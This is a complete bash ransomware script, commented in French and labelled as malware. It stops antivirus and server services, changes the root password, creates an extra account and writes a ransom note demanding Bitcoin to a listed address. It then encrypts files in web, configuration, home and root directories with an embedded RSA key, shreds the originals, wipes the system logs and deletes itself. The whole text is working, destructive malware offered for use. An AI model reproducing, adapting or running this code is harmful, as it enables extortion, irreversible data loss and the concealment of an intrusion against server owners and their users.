#!/bin/bash

# ==============================================================================
#  CONFIGURATION DU MALWARE 
# ==============================================================================

PUB_KEY_CONTENT=$(cat <<EOF
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAlVwOj/yK3RcwNmd/wFlH
0Qbylu6+LdowSdjlRIJ+IZ+QV4/kTbZgIo+WmcMmiaXP49HToLzqHwPRFQGrdLlR
3OdRJmQ+JWmMxq+eVeEFxz+b7vSLtSYqwYlPCDezgshSKQAny0G1DE0FDZbdR4YF
2sFnMggAoYOgUPIhJ5Ud9feuLyz2DAGTrj/1bnexa0HwNUsdPBU4w3IlgYkhQS0Z
7k7DKu9EBMLM+8D2ReRjYIkvDD+GVjIAyLq7UKc0DbpH5DmTajG3XlqgeVIFvfnp
X76An2DFso8zZfB4vUjxizWVQyqGH+lKjlHHL8DJ9y1Az5+Z7kTDKPDeiZQT0hTr
6zV+74UmtCJzxEZvABzFa64pbM0H+tP8SvsYZkj12KHfT210v6AbGIC1hHSHtyzR
PDR+oK0uFOjOioW7l3JRcGy6OtBZ3uL4gtpJp5qXF6fzvgJBj4DfXB4tbC09P8nl
is5fC33L5fWBX6Yz6OZNel0kYp241TpFhvl7dOLAiAoHmVhqP93YrD7FH43hkTQ6
kJuQC8hKFLKeg58ttwWTJnncM2CHAoIDozjMtgQiMk3Ud2O5vbLMk/ZB2H/K5Cln
Mke/N9nZ2jJURuOioDIDl7apL2X7DSmeU5v+cqZoHIA36SsDj4SoW3uHU1/Enuwc
eoaonrrGgtmfv850ICZBod0CAwEAAQ==
-----END PUBLIC KEY-----
EOF
)


NEW_ROOT_PASS="P@ssw0rdRansom123!"
SPECTATOR_USER="guest_$(openssl rand -hex 2)"
SPECTATOR_PASS="HelpMe$(date +%s)"


TARGET_DIRS=(
    "/var/www"     
    "/etc/apache2" "/etc/httpd" "/etc/nginx"     
    "/etc/haproxy" "/etc/squid"    
    "/etc/bind" "/var/named"    
    "/etc/postfix" "/etc/mysql" "/var/lib/mysql"     
    "/home" "/root" "/opt"    
)


SERVICES_TO_KILL=(
    "clamav-daemon" "clamav-freshclam" "unattended-upgrades"     
    "apache2" "httpd" "nginx" "lighttpd"     
    "mysql" "mariadb" "postgresql" "redis-server"     
    "bind9" "named" "dnsmasq"    
    "postfix" "exim4" "dovecot"     
    "haproxy" "squid" "docker"     
)

# ==============================================================================
#  VERIFICATIONS & FONCTIONS
# ==============================================================================


[[ $EUID -ne 0 ]] && echo "Must be root" >&2 && exit 1


secure_wipe() {
    local file="$1"
    if command -v shred &> /dev/null; then
        shred -u -z -n 1 "$file" 2>/dev/null
    else
        dd if=/dev/zero of="$file" bs=1M count=1 conv=notrunc 2>/dev/null
        rm -f "$file"
    fi
}

neutralize_system() {
    echo "[*] Arrêt des services et neutralisation..."
    pkill -9 -f clamav 2>/dev/null
    for SVC in "${SERVICES_TO_KILL[@]}"; do
        if systemctl is-active --quiet "$SVC"; then
            systemctl stop "$SVC" 2>/dev/null
        fi
    done
}


takeover_system() {
    echo "[*] Prise de contrôle..."
    echo "root:$NEW_ROOT_PASS" | chpasswd

    if ! id "$SPECTATOR_USER" &>/dev/null; then
        useradd -m -s /bin/bash "$SPECTATOR_USER"
        echo "$SPECTATOR_USER:$SPECTATOR_PASS" | chpasswd
    fi

    cat > /etc/issue <<EOF
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
                            ⚠️  SYSTÈME VERROUILLÉ ⚠️
                  Utilisateur: $SPECTATOR_USER // Pass: $SPECTATOR_PASS
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
EOF

    cat > "/home/$SPECTATOR_USER/INSTRUCTIONS.txt" <<EOF

VOTRE SERVEUR A ÉTÉ PRIS EN OTAGE

• Chiffrement: AES-256-GCM + RSA-4096
• Fichiers affectés: $(find "${TARGET_DIRS[@]}" -type f 2>/dev/null | wc -l)
• Heure de l'attaque: $(date)
• ID Victime: $(hostname)-$(cat /etc/machine-id)

POUR DÉCHIFFRER:
1. Transférez 0.5 BTC à: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
2. Envoyez votre ID à: decrypt-service@onionmail.org
3. Attendez les instructions (24-48h)

⚠️  AVERTISSEMENTS:
• Les tentatives de restauration échoueront
• La suppression des fichiers .locked/.key est irréversible
• Un kill-switch se déclenche après 7 jours
EOF
    
    chattr +i "/home/$SPECTATOR_USER/INSTRUCTIONS.txt" 2>/dev/null
    chmod 644 "/home/$SPECTATOR_USER/INSTRUCTIONS.txt"

    chmod 755 /root 2>/dev/null
    chmod 755 /home/* 2>/dev/null
    chmod 500 "/home/$SPECTATOR_USER"
}

# ==============================================================================
#  EXECUTION PRINCIPALE
# ==============================================================================

TMP_PUB="/tmp/.pk_$(date +%s).pem"
echo "$PUB_KEY_CONTENT" > "$TMP_PUB"

neutralize_system
takeover_system

echo "[*] Chiffrement et Wiping en cours..."

for TARGET_PATH in "${TARGET_DIRS[@]}"; do
    if [ ! -d "$TARGET_PATH" ]; then continue; fi
    echo "   -> Zone : $TARGET_PATH"

    find "$TARGET_PATH" -type f \
        ! -name "*.locked" ! -name "*.key" ! -name "*.meta" ! -name "INSTRUCTIONS.txt" \
        ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" \
        ! -path "/boot/*" ! -name "encrypt_final.sh" | while read -r FILE; do
        
	stat -c "%a:%U:%G" "$FILE" > "$FILE.meta"

        EXT_KEY=$(openssl rand -base64 32)
        
        echo -n "$EXT_KEY" | openssl enc -aes-256-cbc -salt -in "$FILE" -out "$FILE.locked" -pass stdin -pbkdf2 2>/dev/null
        
        if [ $? -eq 0 ]; then
            echo -n "$EXT_KEY" | openssl pkeyutl -encrypt -pubin -inkey "$TMP_PUB" -out "$FILE.key"
            
	    chmod 644 "$FILE.locked" "$FILE.key" "$FILE.meta" 2>/dev/null
            chattr +i "$FILE.locked" "$FILE.key" "$FILE.meta" 2>/dev/null
            secure_wipe "$FILE"
        else
            rm -f "$FILE.locked" "$FILE.meta"
        fi
    done
done

rm -f "$TMP_PUB"             
echo "" > /var/log/syslog    
echo "" > /var/log/auth.log  
history -c                   
if [ -f "$0" ]; then shred -u "$0"; fi  
echo "[DONE] Système compromis."
